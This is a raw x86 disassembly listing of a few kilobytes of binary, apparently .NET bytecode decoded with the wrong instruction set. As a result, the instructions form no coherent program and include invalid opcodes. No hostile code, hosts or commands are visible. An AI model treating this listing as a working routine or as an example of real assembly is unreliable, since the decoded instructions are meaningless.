  404c2f:	add    BYTE PTR [eax+eax*1],dh
  404c32:	add    BYTE PTR [ecx],dl
  404c34:	add    bh,BYTE PTR [ebx+0x34]
  404c37:	add    BYTE PTR [eax],al
  404c39:	add    al,0x73
  404c3b:	sbb    eax,DWORD PTR [eax]
  404c3d:	add    BYTE PTR [esi],al
  404c3f:	or     al,BYTE PTR [ebx]
  404c41:	sub    al,0xf
  404c43:	add    bh,BYTE PTR [ebx+0x39]
  404c46:	add    BYTE PTR [eax],al
  404c48:	add    al,0x4
  404c4a:	push   es
  404c4b:	outs   dx,DWORD PTR ds:[esi]
  404c4c:	cmp    eax,DWORD PTR [ecx]
  404c4e:	add    BYTE PTR [edx],cl
  404c50:	sub    ecx,DWORD PTR ds:0x397b02
  404c56:	add    BYTE PTR [esi+eax*1],al
  404c59:	add    eax,0x13c6f
  404c5e:	or     bl,ch
  404c60:	add    DWORD PTR [ecx],eax
  404c62:	add    BYTE PTR [eax],al
  404c64:	or     eax,DWORD PTR [esi]
  404c66:	pop    es
  404c67:	outs   dx,DWORD PTR ds:[esi]
  404c68:	and    BYTE PTR [eax],al
  404c6a:	add    BYTE PTR [esi],al
  404c6c:	(bad)  
  404c6e:	add    BYTE PTR [eax],al
  404c70:	add    BYTE PTR [esi],ah
  404c72:	fucomp st(6)
  404c74:	add    BYTE PTR [eax],al
  404c76:	add    BYTE PTR [eax+ecx*1],cl
  404c79:	outs   dx,DWORD PTR ds:[esi]
  404c7a:	cmp    eax,0x6f0a0001
  404c7f:	add    DWORD PTR ds:[eax],eax
  404c82:	or     dl,BYTE PTR [ebx]
  404c84:	or     DWORD PTR [ebx],ebp
  404c86:	adc    al,0x11
  404c88:	or     DWORD PTR [edi-0x6d],ebp
  404c8b:	add    BYTE PTR [eax],al
  404c8d:	or     dh,BYTE PTR [edi+eiz*1+0x0]
  404c91:	add    BYTE PTR [ecx],al
  404c93:	or     eax,0x1f6f0906
  404c98:	add    BYTE PTR [eax],al
  404c9a:	push   es
  404c9b:	adc    DWORD PTR [ecx],ecx
  404c9d:	outs   dx,DWORD PTR ds:[esi]
  404c9e:	test   BYTE PTR [eax],al
  404ca0:	add    BYTE PTR [edx],cl
  404ca2:	sub    eax,0x1115dee3
  404ca7:	or     DWORD PTR [ebp+0x12],esi
  404caa:	add    BYTE PTR [eax],al
  404cac:	add    DWORD PTR [ebx],edx
  404cae:	or     dl,BYTE PTR [ecx]
  404cb0:	or     ch,BYTE PTR [edi+eax*1]
  404cb3:	adc    DWORD PTR [edx],ecx
  404cb5:	outs   dx,DWORD PTR ds:[esi]
  404cb6:	inc    ebx
  404cb7:	add    BYTE PTR [eax],al
  404cb9:	or     bl,ah
  404cbb:	frstor [ebp+0x13000000]
  404cc1:	add    al,0x11
  404cc3:	add    al,0x6f
  404cc5:	cmp    al,BYTE PTR [ecx]
  404cc7:	add    BYTE PTR [edx],cl
  404cc9:	adc    eax,DWORD PTR ds:0x28750511
  404ccf:	add    BYTE PTR [eax],al
  404cd1:	add    DWORD PTR [ebx+edx*1],ebp
  404cd4:	adc    DWORD PTR ds:0x2875,eax
  404cda:	add    DWORD PTR [ebx],edx
  404cdc:	push   es
  404cdd:	push   es
  404cde:	adc    DWORD PTR [esi],eax
  404ce0:	outs   dx,DWORD PTR ds:[esi]
  404ce1:	and    BYTE PTR [eax],al
  404ce3:	add    BYTE PTR [esi],al
  404ce5:	sub    edi,DWORD PTR [ecx+edx*1+0x5]
  404ce9:	jne    0x404cb0
  404ceb:	add    BYTE PTR [eax],al
  404ced:	add    DWORD PTR [edi+ecx*2],ebp
  404cf0:	adc    DWORD PTR ds:0xc575,eax
  404cf6:	add    DWORD PTR [ebx],edx
  404cf8:	pop    es
  404cf9:	adc    DWORD PTR [edi],eax
  404cfb:	outs   dx,DWORD PTR ds:[esi]
  404cfc:	cmp    eax,0x6f0a0001
  404d01:	add    DWORD PTR ds:[eax],eax
  404d04:	or     dl,BYTE PTR [ebx]
  404d06:	or     ebp,DWORD PTR [ebx]
  404d08:	push   ss
  404d09:	adc    DWORD PTR [ebx],ecx
  404d0b:	outs   dx,DWORD PTR ds:[esi]
  404d0c:	xchg   ebx,eax
  404d0d:	add    BYTE PTR [eax],al
  404d0f:	or     dh,BYTE PTR [edi+eiz*1+0x0]
  404d13:	add    BYTE PTR [ecx],al
  404d15:	adc    ecx,DWORD PTR [eax]
  404d17:	push   es
  404d18:	adc    DWORD PTR [eax],ecx
  404d1a:	outs   dx,DWORD PTR ds:[esi]
  404d1b:	pop    ds
  404d1c:	add    BYTE PTR [eax],al
  404d1e:	push   es
  404d1f:	adc    DWORD PTR [ebx],ecx
  404d21:	outs   dx,DWORD PTR ds:[esi]
  404d22:	test   BYTE PTR [eax],al
  404d24:	add    BYTE PTR [edx],cl
  404d26:	sub    eax,0x1139dee1
  404d2b:	or     esi,DWORD PTR [ebp+0x12]
  404d2e:	add    BYTE PTR [eax],al
  404d30:	add    DWORD PTR [ebx],edx
  404d32:	or     al,0x11
  404d34:	or     al,0x2c
  404d36:	pop    es
  404d37:	adc    DWORD PTR [edi+ebp*2],ecx
  404d3a:	inc    ebx
  404d3b:	add    BYTE PTR [eax],al
  404d3d:	or     bl,ah
  404d3f:	adc    DWORD PTR ds:0x511122c,eax
  404d45:	jne    0x404d0b
  404d47:	add    BYTE PTR [eax],al
  404d49:	add    DWORD PTR ds:0x75051117,ebp
  404d4f:	lds    eax,FWORD PTR [eax]
  404d51:	add    BYTE PTR [ecx],al
  404d53:	sub    eax,0x1104060e
  404d58:	add    al,0x6f
  404d5a:	std    
  404d5b:	add    BYTE PTR [eax],al
  404d5d:	or     ch,BYTE PTR [edi+0x21]
  404d60:	add    BYTE PTR [eax],al
  404d62:	push   es
  404d63:	fiadd  WORD PTR [eax]
  404d65:	sub    al,BYTE PTR [eax]
  404d67:	add    BYTE PTR [ecx],al
  404d69:	dec    esp
  404d6a:	add    BYTE PTR [eax],al
  404d6c:	add    BYTE PTR [eax],al
  404d6e:	or     al,0x0
  404d70:	and    al,0x30
  404d72:	add    BYTE PTR ds:0x1000028,cl
  404d78:	add    BYTE PTR [eax],al
  404d7a:	or     al,0x0
  404d7c:	and    al,0x3d
  404d7e:	add    BYTE PTR [esi],al
  404d80:	les    eax,FWORD PTR [eax]
  404d82:	add    BYTE PTR [ecx],al
  404d84:	add    al,BYTE PTR [eax]
  404d86:	push   ecx
  404d87:	add    BYTE PTR [ecx],ah
  404d89:	jb     0x404d8b
  404d8b:	adc    eax,0x0
  404d90:	add    BYTE PTR [eax],al
  404d92:	or     al,0x0
  404d94:	and    al,0x43
  404d96:	add    BYTE PTR [ecx-0x3b],cl
  404d99:	add    BYTE PTR [eax],al
  404d9b:	add    DWORD PTR [edx],eax
  404d9d:	add    bl,dl
  404d9f:	add    BYTE PTR [ebx],ah
  404da1:	test   BYTE PTR [eax],0x15
  404da4:	add    BYTE PTR [eax],al
  404da6:	add    BYTE PTR [eax],al
  404da8:	add    BYTE PTR [eax],al
  404daa:	or     al,0x0
  404dac:	and    al,0x8c
  404dae:	add    BYTE PTR [ebp+0x1000036],ah
  404db4:	or     esi,DWORD PTR [eax]
  404db6:	add    al,BYTE PTR [eax]
  404db8:	add    BYTE PTR cs:[eax],al
  404dbb:	add    BYTE PTR [eax],al
  404dbd:	add    BYTE PTR [eax],al
  404dbf:	add    BYTE PTR [edx],al
  404dc1:	jnp    0x404e01
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	add    al,0x6f
  404dc7:	xor    BYTE PTR [eax],al
  404dc9:	add    BYTE PTR [esi],al
  404dcb:	sub    BYTE PTR [eax+0x2c0a0000],bl
  404dd1:	push   ss
  404dd2:	add    bh,BYTE PTR [ebx+0x3e]
  404dd5:	add    BYTE PTR [eax],al
  404dd7:	add    al,0x2
  404dd9:	jnp    0x404e14
  404ddb:	add    BYTE PTR [eax],al
  404ddd:	add    al,0x6f
  404ddf:	add    al,0x1
  404de1:	add    BYTE PTR [edx],cl
  404de3:	outs   dx,DWORD PTR ds:[esi]
  404de4:	xor    DWORD PTR [eax],eax
  404de6:	add    BYTE PTR [esi],al
  404de8:	fiadd  WORD PTR [ebx]
  404dea:	fiadd  WORD PTR es:[eax]
  404ded:	sub    al,BYTE PTR [eax]
  404def:	add    BYTE PTR [ecx],al
  404df1:	adc    BYTE PTR [eax],al
  404df3:	add    BYTE PTR [eax],al
  404df5:	add    BYTE PTR [eax],al
  404df7:	add    BYTE PTR [edx],ch
  404df9:	sub    al,BYTE PTR [eax]
  404dfb:	add    esi,DWORD PTR [esi]
  404dfd:	add    BYTE PTR [eax],al
  404dff:	add    DWORD PTR [ebx],ebx
  404e01:	xor    BYTE PTR [ebx],al
  404e03:	add    BYTE PTR [ebp+0x0],cl
  404e06:	add    BYTE PTR [eax],al
  404e08:	xor    eax,0x2110000
  404e0d:	sub    BYTE PTR [esi+0x2060000],cl
  404e13:	jnp    0x404e49
  404e15:	add    BYTE PTR [eax],al
  404e17:	add    al,0x6f
  404e19:	xchg   esi,eax
  404e1a:	add    BYTE PTR [eax],al
  404e1c:	push   es
  404e1d:	add    bh,BYTE PTR [ebx+0x3f]
  404e20:	add    BYTE PTR [eax],al
  404e22:	add    al,0x2c
  404e24:	add    bh,BYTE PTR cs:[ebx+0x39]
  404e28:	add    BYTE PTR [eax],al
  404e2a:	add    al,0xd0
  404e2c:	adc    al,BYTE PTR [eax]
  404e2e:	add    BYTE PTR [edx],al
  404e30:	sub    BYTE PTR [esi+0x0],al
  404e33:	add    BYTE PTR [edx],cl
  404e35:	push   ss
  404e36:	outs   dx,DWORD PTR ds:[esi]
  404e37:	xor    al,0x1
  404e39:	add    BYTE PTR [edx],cl
  404e3b:	je     0x404e4f
  404e3d:	add    BYTE PTR [eax],al
  404e3f:	add    cl,BYTE PTR [edx]
  404e41:	push   es
  404e42:	add    bh,BYTE PTR [ebx+0x34]
  404e45:	add    BYTE PTR [eax],al
  404e47:	add    al,0x6f
  404e49:	mov    ds:0x2060000,al
  404e4e:	sub    BYTE PTR [esi+0x0],dh
  404e51:	add    BYTE PTR [esi],al
  404e53:	fiadd  WORD PTR [ebx]
  404e55:	fiadd  WORD PTR es:[eax]
  404e58:	sub    al,BYTE PTR [eax]
  404e5a:	add    BYTE PTR [eax],al
  404e5c:	add    DWORD PTR [eax],edx
  404e5e:	add    BYTE PTR [eax],al
  404e60:	add    BYTE PTR [eax],al
  404e62:	add    BYTE PTR [eax],al
  404e64:	dec    ecx
  404e65:	dec    ecx
  404e66:	add    BYTE PTR [ebx],al
  404e68:	add    BYTE PTR ss:[eax],al
  404e6b:	add    DWORD PTR [ebx],ebx
  404e6d:	xor    BYTE PTR [edx],al
  404e6f:	add    BYTE PTR [ecx],dh
  404e71:	add    BYTE PTR [eax],al
  404e73:	add    BYTE PTR [edi],dh
  404e75:	add    BYTE PTR [eax],al
  404e77:	adc    DWORD PTR [edx],eax
  404e79:	jnp    0x404ebc
  404e7b:	add    BYTE PTR [eax],al
  404e7d:	add    al,0x6f
  404e7f:	pop    ds
  404e80:	add    BYTE PTR [eax],al
  404e82:	or     ah,BYTE PTR [esi]
  404e84:	add    bh,BYTE PTR [ebx+0x3e]
  404e87:	add    BYTE PTR [eax],al
  404e89:	add    al,0x16
  404e8b:	outs   dx,DWORD PTR ds:[esi]
  404e8c:	xor    eax,0x4060000
  404e91:	outs   dx,DWORD PTR ds:[esi]
  404e92:	aas    
  404e93:	add    DWORD PTR [eax],eax
  404e95:	or     cl,BYTE PTR [edx]
  404e97:	add    bh,BYTE PTR [ebx+0x34]
  404e9a:	add    BYTE PTR [eax],al
  404e9c:	add    al,0x6
  404e9e:	outs   dx,DWORD PTR ds:[esi]
  404e9f:	xchg   esp,eax
  404ea0:	add    BYTE PTR [eax],al
  404ea2:	push   es
  404ea3:	fiadd  WORD PTR [ebx]
  404ea5:	fiadd  WORD PTR es:[eax]
  404ea8:	sub    al,BYTE PTR [eax]
  404eaa:	add    BYTE PTR [eax],al
  404eac:	add    DWORD PTR [eax],edx
  404eae:	add    BYTE PTR [eax],al
  404eb0:	add    BYTE PTR [eax],al
  404eb2:	add    BYTE PTR [eax],al
  404eb4:	sub    eax,0x3603002d
  404eb9:	add    BYTE PTR [eax],al
  404ebb:	add    DWORD PTR [ebx],ebx
  404ebd:	xor    BYTE PTR [edx],al
  404ebf:	add    BYTE PTR [ecx],bl
  404ec1:	add    BYTE PTR [eax],al
  404ec3:	add    BYTE PTR [edi],dh
  404ec5:	add    BYTE PTR [eax],al
  404ec7:	adc    DWORD PTR [edi+ebp*2],eax
  404eca:	aas    
  404ecb:	add    DWORD PTR [eax],eax
  404ecd:	or     cl,BYTE PTR [edx]
  404ecf:	add    bh,BYTE PTR [ebx+0x34]
  404ed2:	add    BYTE PTR [eax],al
  404ed4:	add    al,0x6
  404ed6:	outs   dx,DWORD PTR ds:[esi]
  404ed7:	xchg   ebp,eax
  404ed8:	add    BYTE PTR [eax],al
  404eda:	push   es
  404edb:	fiadd  WORD PTR [ebx]
  404edd:	fiadd  WORD PTR es:[eax]
  404ee0:	sub    al,BYTE PTR [eax]
  404ee2:	add    BYTE PTR [eax],al
  404ee4:	add    DWORD PTR [eax],edx
  404ee6:	add    BYTE PTR [eax],al
  404ee8:	add    BYTE PTR [eax],al
  404eea:	add    BYTE PTR [eax],al
  404eec:	adc    eax,0x36030015
  404ef1:	add    BYTE PTR [eax],al
  404ef3:	add    DWORD PTR [edx],edi
  404ef5:	add    ch,BYTE PTR [eax]
  404ef7:	xchg   esi,eax
  404ef8:	add    BYTE PTR [eax],al
  404efa:	or     al,BYTE PTR [edx]
  404efc:	add    edi,DWORD PTR [ebp+0x43]
  404eff:	add    BYTE PTR [eax],al
  404f01:	add    al,0x2a
  404f03:	add    BYTE PTR [ebx],dl
  404f05:	xor    BYTE PTR [edx],al
  404f07:	add    BYTE PTR [ebx+0x0],dl
  404f0a:	add    BYTE PTR [eax],al
  404f0c:	add    BYTE PTR es:[eax],al
  404f0f:	adc    DWORD PTR [edx],eax
  404f11:	sub    BYTE PTR [eax+0x1],al
  404f14:	add    BYTE PTR [edx],cl
  404f16:	je     0x404f45
  404f18:	add    BYTE PTR [eax],al
  404f1a:	add    DWORD PTR [edx],ecx
  404f1c:	push   es
  404f1d:	outs   dx,DWORD PTR ds:[esi]
  404f1e:	inc    ecx
  404f1f:	add    DWORD PTR [eax],eax
  404f21:	or     dl,BYTE PTR [edi]
  404f23:	xor    edi,DWORD PTR [esi+eax*1]
  404f26:	and    eax,DWORD PTR [eax]
  404f28:	add    BYTE PTR [eax],al
  404f2a:	add    BYTE PTR [eax],al
  404f2c:	add    BYTE PTR [eax+eax*2],dl
  404f2f:	sub    BYTE PTR [edx+0x1],al
  404f32:	add    BYTE PTR [edx],cl
  404f34:	outs   dx,DWORD PTR ds:[esi]
  404f35:	inc    ebx
  404f36:	add    DWORD PTR [eax],eax
  404f38:	or     al,BYTE PTR [esi]
  404f3a:	and    eax,DWORD PTR [eax]
  404f3c:	add    BYTE PTR [eax],al
  404f3e:	add    BYTE PTR [eax],al
  404f40:	add    BYTE PTR [esi+0x40],cl
  404f43:	sub    BYTE PTR [ecx+eax*1+0x0],al
  404f47:	or     ch,BYTE PTR [edi+0x45]
  404f4a:	add    DWORD PTR [eax],eax
  404f4c:	or     al,BYTE PTR [esi]
  404f4e:	and    eax,DWORD PTR [eax]
  404f50:	add    BYTE PTR [eax],al
  404f52:	add    BYTE PTR [eax],al
  404f54:	add    BYTE PTR [esi+0x40],cl
  404f57:	sub    BYTE PTR [ecx+eax*1+0x0],al
  404f5b:	or     ch,BYTE PTR [edi+0x46]
  404f5e:	add    DWORD PTR [eax],eax
  404f60:	or     al,BYTE PTR [esi]
  404f62:	sub    bl,BYTE PTR [esi]
  404f64:	add    ch,BYTE PTR [eax]
  404f66:	pop    eax
  404f67:	add    BYTE PTR [eax],al
  404f69:	or     ch,BYTE PTR [edx]
  404f6b:	pop    esi
  404f6c:	add    bh,BYTE PTR [ebx+0x4b]
  404f6f:	add    BYTE PTR [eax],al
  404f71:	add    al,0x7b
  404f73:	inc    ebx
  404f74:	add    BYTE PTR [eax],al
  404f76:	add    al,0x2
  404f78:	jnp    0x404fc6
  404f7a:	add    BYTE PTR [eax],al
  404f7c:	add    al,0x6f
  404f7e:	inc    edi
  404f7f:	add    DWORD PTR [eax],eax
  404f81:	or     ch,BYTE PTR [edx]
  404f83:	add    BYTE PTR [ebx],dl
  404f85:	xor    BYTE PTR [ebx],al
  404f87:	add    BYTE PTR [edi],ah
  404f89:	add    BYTE PTR [eax],al
  404f8b:	add    BYTE PTR [eax],bh
  404f8d:	add    BYTE PTR [eax],al
  404f8f:	adc    DWORD PTR [ebx-0x49],esi
  404f92:	add    BYTE PTR [eax],al
  404f94:	push   es
  404f95:	or     al,BYTE PTR [esi]
  404f97:	add    edi,DWORD PTR [ebp+0x4c]
  404f9a:	add    BYTE PTR [eax],al
  404f9c:	add    al,0x6
  404f9e:	add    bh,BYTE PTR [ebp+0x4b]
  404fa1:	add    BYTE PTR [eax],al
  404fa3:	add    al,0x2
  404fa5:	push   es
  404fa6:	inc    BYTE PTR [esi]
  404fa8:	mov    eax,0x73060000
  404fad:	dec    eax
  404fae:	add    DWORD PTR [eax],eax
  404fb0:	or     ch,BYTE PTR [eax]
  404fb2:	popf   
  404fb3:	add    BYTE PTR [eax],al
  404fb5:	push   es
  404fb6:	sub    bl,BYTE PTR [esi]
  404fb8:	add    ch,BYTE PTR [eax]
  404fba:	pop    eax
  404fbb:	add    BYTE PTR [eax],al
  404fbd:	or     ch,BYTE PTR [edx]
  404fbf:	pop    esi
  404fc0:	add    bh,BYTE PTR [ebx+0x4d]
  404fc3:	add    BYTE PTR [eax],al
  404fc5:	add    al,0x7b
  404fc7:	inc    ebx
  404fc8:	add    BYTE PTR [eax],al
  404fca:	add    al,0x2
  404fcc:	jnp    0x40501c
  404fce:	add    BYTE PTR [eax],al
  404fd0:	add    al,0x6f
  404fd2:	dec    ecx
  404fd3:	add    DWORD PTR [eax],eax
  404fd5:	or     ch,BYTE PTR [edx]
  404fd7:	add    BYTE PTR [ebx],dl
  404fd9:	xor    BYTE PTR [ebx],al
  404fdb:	add    BYTE PTR [edi],ah
  404fdd:	add    BYTE PTR [eax],al
  404fdf:	add    BYTE PTR [ecx],bh
  404fe1:	add    BYTE PTR [eax],al
  404fe3:	adc    DWORD PTR [ebx-0x47],esi
  404fe6:	add    BYTE PTR [eax],al
  404fe8:	push   es
  404fe9:	or     al,BYTE PTR [esi]
  404feb:	add    edi,DWORD PTR [ebp+0x4e]
  404fee:	add    BYTE PTR [eax],al
  404ff0:	add    al,0x6
  404ff2:	add    bh,BYTE PTR [ebp+0x4d]
  404ff5:	add    BYTE PTR [eax],al
  404ff7:	add    al,0x2
  404ff9:	push   es
  404ffa:	inc    BYTE PTR [esi]
  404ffc:	mov    edx,0x73060000
  405001:	dec    eax
  405002:	add    DWORD PTR [eax],eax
  405004:	or     ch,BYTE PTR [eax]
  405006:	popf   
  405007:	add    BYTE PTR [eax],al
  405009:	push   es
  40500a:	sub    dh,BYTE PTR [edx]
  40500c:	add    bh,BYTE PTR [ebx+0x43]
  40500f:	add    BYTE PTR [eax],al
  405011:	add    al,0x6f
  405013:	dec    edx
  405014:	add    DWORD PTR [eax],eax
  405016:	or     ch,BYTE PTR [edx]
  405018:	dec    esi
  405019:	add    al,BYTE PTR [edx]
  40501b:	inc    BYTE PTR [esi]
  40501d:	lahf   
  40501e:	add    BYTE PTR [eax],al
  405020:	push   es
  405021:	jae    0x40506b
  405023:	add    DWORD PTR [eax],eax
  405025:	or     ch,BYTE PTR [eax]
  405027:	popf   
  405028:	add    BYTE PTR [eax],al
  40502a:	push   es
  40502b:	sub    bl,BYTE PTR [esi]
  40502d:	add    ch,BYTE PTR [eax]
  40502f:	pop    eax
  405030:	add    BYTE PTR [eax],al
  405032:	or     ch,BYTE PTR [edx]
  405034:	out    dx,al
  405035:	add    bh,BYTE PTR [ebx+0x4f]
  405038:	add    BYTE PTR [eax],al
  40503a:	add    al,0x7b
  40503c:	inc    ebx
  40503d:	add    BYTE PTR [eax],al
  40503f:	add    al,0x2
  405041:	jnp    0x405093
  405043:	add    BYTE PTR [eax],al
  405045:	add    al,0x2
  405047:	jnp    0x40509a
  405049:	add    BYTE PTR [eax],al
  40504b:	add    al,0x2
  40504d:	jnp    0x4050a1
  40504f:	add    BYTE PTR [eax],al
  405051:	add    al,0x2
  405053:	jnp    0x4050a8
  405055:	add    BYTE PTR [eax],al
  405057:	add    al,0x2
  405059:	jnp    0x4050af
  40505b:	add    BYTE PTR [eax],al
  40505d:	add    al,0x2
  40505f:	jnp    0x4050b6
  405061:	add    BYTE PTR [eax],al
  405063:	add    al,0x2
  405065:	jnp    0x4050bd
  405067:	add    BYTE PTR [eax],al
  405069:	add    al,0x6f
  40506b:	dec    ebx
  40506c:	add    DWORD PTR [eax],eax
  40506e:	or     ch,BYTE PTR [edx]
  405070:	adc    esi,DWORD PTR [eax]
  405072:	add    eax,DWORD PTR [eax]
  405074:	push   ebp
  405075:	add    BYTE PTR [eax],al
  405077:	add    BYTE PTR [edx],bh
  405079:	add    BYTE PTR [eax],al
  40507b:	adc    DWORD PTR [ebx-0x45],esi
  40507e:	add    BYTE PTR [eax],al
  405080:	push   es
  405081:	or     al,BYTE PTR [esi]
  405083:	add    edi,DWORD PTR [ebp+0x50]
  405086:	add    BYTE PTR [eax],al
  405088:	add    al,0x6
  40508a:	add    al,0x7d
  40508c:	push   ecx
  40508d:	add    BYTE PTR [eax],al
  40508f:	add    al,0x6
  405091:	add    eax,0x527d
  405096:	add    al,0x6
  405098:	push   cs
  405099:	add    al,0x7d
  40509b:	push   ebx
  40509c:	add    BYTE PTR [eax],al
  40509e:	add    al,0x6
  4050a0:	push   cs
  4050a1:	add    eax,0x547d
  4050a6:	add    al,0x6
  4050a8:	push   cs
  4050a9:	push   es
  4050aa:	jge    0x405101
  4050ac:	add    BYTE PTR [eax],al
  4050ae:	add    al,0x6
  4050b0:	push   cs
  4050b1:	pop    es
  4050b2:	jge    0x40510a
  4050b4:	add    BYTE PTR [eax],al
  4050b6:	add    al,0x6
  4050b8:	add    bh,BYTE PTR [ebp+0x4f]
  4050bb:	add    BYTE PTR [eax],al
  4050bd:	add    al,0x2
  4050bf:	push   es
  4050c0:	inc    BYTE PTR [esi]
  4050c2:	mov    esp,0x73060000
  4050c7:	dec    eax
  4050c8:	add    DWORD PTR [eax],eax
  4050ca:	or     ch,BYTE PTR [eax]
  4050cc:	popf   
  4050cd:	add    BYTE PTR [eax],al
  4050cf:	push   es
  4050d0:	sub    bl,BYTE PTR [esi]
  4050d2:	add    ch,BYTE PTR [eax]
  4050d4:	pop    eax
  4050d5:	add    BYTE PTR [eax],al
  4050d7:	or     ch,BYTE PTR [edx]
  4050d9:	pop    esi
  4050da:	add    bh,BYTE PTR [ebx+0x57]
  4050dd:	add    BYTE PTR [eax],al
  4050df:	add    al,0x7b
  4050e1:	inc    ebx
  4050e2:	add    BYTE PTR [eax],al
  4050e4:	add    al,0x2
  4050e6:	jnp    0x405140
  4050e8:	add    BYTE PTR [eax],al
  4050ea:	add    al,0x6f
  4050ec:	dec    esp
  4050ed:	add    DWORD PTR [eax],eax
  4050ef:	or     ch,BYTE PTR [edx]
  4050f1:	add    BYTE PTR [eax],al
  4050f3:	add    BYTE PTR [ebx],dl
  4050f5:	xor    BYTE PTR [ebx],al
  4050f7:	add    BYTE PTR [edi],ah
  4050f9:	add    BYTE PTR [eax],al
  4050fb:	add    BYTE PTR [ebx],bh
  4050fd:	add    BYTE PTR [eax],al
  4050ff:	adc    DWORD PTR [ebx-0x43],esi
  405102:	add    BYTE PTR [eax],al
  405104:	push   es
  405105:	or     al,BYTE PTR [esi]
  405107:	add    edi,DWORD PTR [ebp+0x58]
  40510a:	add    BYTE PTR [eax],al
  40510c:	add    al,0x6
  40510e:	add    bh,BYTE PTR [ebp+0x57]
  405111:	add    BYTE PTR [eax],al
  405113:	add    al,0x2
  405115:	push   es
  405116:	inc    BYTE PTR [esi]
  405118:	mov    esi,0x73060000
  40511d:	dec    eax
  40511e:	add    DWORD PTR [eax],eax
  405120:	or     ch,BYTE PTR [eax]
  405122:	popf   
  405123:	add    BYTE PTR [eax],al
  405125:	push   es
  405126:	sub    bl,BYTE PTR [esi]
  405128:	add    ch,BYTE PTR [eax]
  40512a:	pop    eax
  40512b:	add    BYTE PTR [eax],al
  40512d:	or     ch,BYTE PTR [edx]
  40512f:	jbe    0x405133
  405131:	add    bh,BYTE PTR [ebx+0x5a]
  405134:	add    BYTE PTR [eax],al
  405136:	add    al,0x7b
  405138:	inc    ebx
  405139:	add    BYTE PTR [eax],al
  40513b:	add    al,0x2
  40513d:	jnp    0x40519a
  40513f:	add    BYTE PTR [eax],al
  405141:	add    al,0x6f
  405143:	dec    ebp
  405144:	add    DWORD PTR [eax],eax
  405146:	or     bh,BYTE PTR [ebp+0x59]
  405149:	add    BYTE PTR [eax],al
  40514b:	add    al,0x2a
  40514d:	add    BYTE PTR [eax],al
  40514f:	add    BYTE PTR [ebx],dl
  405151:	xor    BYTE PTR [ebx],al
  405153:	add    BYTE PTR [eax+eax*1],dh
  405156:	add    BYTE PTR [eax],al
  405158:	cmp    al,0x0
  40515a:	add    BYTE PTR [ecx],dl
  40515c:	jae    0x40511d
  40515e:	add    BYTE PTR [eax],al
  405160:	push   es
  405161:	or     al,BYTE PTR [esi]
  405163:	add    edi,DWORD PTR [ebp+0x5b]
  405166:	add    BYTE PTR [eax],al
  405168:	add    al,0x6
  40516a:	add    bh,BYTE PTR [ebp+0x5a]
  40516d:	add    BYTE PTR [eax],al
  40516f:	add    al,0x6
  405171:	adc    al,0x7d
  405173:	pop    ecx
  405174:	add    BYTE PTR [eax],al
  405176:	add    al,0x2
  405178:	push   es
  405179:	inc    BYTE PTR [esi]
  40517b:	rol    BYTE PTR [eax],0x0
  40517e:	push   es
  40517f:	jae    0x4051c9
  405181:	add    DWORD PTR [eax],eax
  405183:	or     ch,BYTE PTR [eax]
  405185:	sahf   
  405186:	add    BYTE PTR [eax],al
  405188:	push   es
  405189:	push   es
  40518a:	jnp    0x4051e5
  40518c:	add    BYTE PTR [eax],al
  40518e:	add    al,0x2a
  405190:	push   ds
  405191:	add    ch,BYTE PTR [eax]
  405193:	pop    eax
  405194:	add    BYTE PTR [eax],al
  405196:	or     ch,BYTE PTR [edx]
  405198:	jbe    0x40519c
  40519a:	add    bh,BYTE PTR [ebx+0x5d]
  40519d:	add    BYTE PTR [eax],al
  40519f:	add    al,0x7b
  4051a1:	inc    ebx
  4051a2:	add    BYTE PTR [eax],al
  4051a4:	add    al,0x2
  4051a6:	jnp    0x405206
  4051a8:	add    BYTE PTR [eax],al
  4051aa:	add    al,0x6f
  4051ac:	dec    esi
  4051ad:	add    DWORD PTR [eax],eax
  4051af:	or     bh,BYTE PTR [ebp+0x5c]
  4051b2:	add    BYTE PTR [eax],al
  4051b4:	add    al,0x2a
  4051b6:	add    BYTE PTR [eax],al
  4051b8:	adc    esi,DWORD PTR [eax]
  4051ba:	add    eax,DWORD PTR [eax]
  4051bc:	xor    al,0x0
  4051be:	add    BYTE PTR [eax],al
  4051c0:	cmp    eax,0x73110000
  4051c5:	rol    DWORD PTR [eax],0x0
  4051c8:	push   es
  4051c9:	or     al,BYTE PTR [esi]
  4051cb:	add    edi,DWORD PTR [ebp+0x5e]
  4051ce:	add    BYTE PTR [eax],al
  4051d0:	add    al,0x6
  4051d2:	add    bh,BYTE PTR [ebp+0x5d]
  4051d5:	add    BYTE PTR [eax],al
  4051d7:	add    al,0x6
  4051d9:	adc    al,0x7d
  4051db:	pop    esp
  4051dc:	add    BYTE PTR [eax],al
  4051de:	add    al,0x2
  4051e0:	push   es
  4051e1:	inc    BYTE PTR [esi]
  4051e3:	ret    0x0
  4051e6:	push   es
  4051e7:	jae    0x405231
  4051e9:	add    DWORD PTR [eax],eax
  4051eb:	or     ch,BYTE PTR [eax]
  4051ed:	sahf   
  4051ee:	add    BYTE PTR [eax],al
  4051f0:	push   es
  4051f1:	push   es
  4051f2:	jnp    0x405250
  4051f4:	add    BYTE PTR [eax],al
  4051f6:	add    al,0x2a
  4051f8:	push   ds
  4051f9:	add    ch,BYTE PTR [eax]
  4051fb:	pop    eax
  4051fc:	add    BYTE PTR [eax],al
  4051fe:	or     ch,BYTE PTR [edx]
  405200:	jbe    0x405204
  405202:	add    bh,BYTE PTR [ebx+0x60]
  405205:	add    BYTE PTR [eax],al
  405207:	add    al,0x7b
  405209:	inc    ebx
  40520a:	add    BYTE PTR [eax],al
  40520c:	add    al,0x2
  40520e:	jnp    0x405271
  405210:	add    BYTE PTR [eax],al
  405212:	add    al,0x6f
  405214:	dec    edi
  405215:	add    DWORD PTR [eax],eax
  405217:	or     bh,BYTE PTR [ebp+0x5f]
  40521a:	add    BYTE PTR [eax],al
  40521c:	add    al,0x2a
  40521e:	add    BYTE PTR [eax],al
  405220:	adc    esi,DWORD PTR [eax]
  405222:	add    eax,DWORD PTR [eax]
  405224:	xor    al,0x0
  405226:	add    BYTE PTR [eax],al
  405228:	add    BYTE PTR ds:[eax],al
  40522b:	adc    DWORD PTR [ebx-0x3d],esi
  40522e:	add    BYTE PTR [eax],al
  405230:	push   es
  405231:	or     al,BYTE PTR [esi]
  405233:	add    edi,DWORD PTR [ebp+0x61]
  405236:	add    BYTE PTR [eax],al
  405238:	add    al,0x6
  40523a:	add    bh,BYTE PTR [ebp+0x60]
  40523d:	add    BYTE PTR [eax],al
  40523f:	add    al,0x6
  405241:	adc    al,0x7d
  405243:	pop    edi
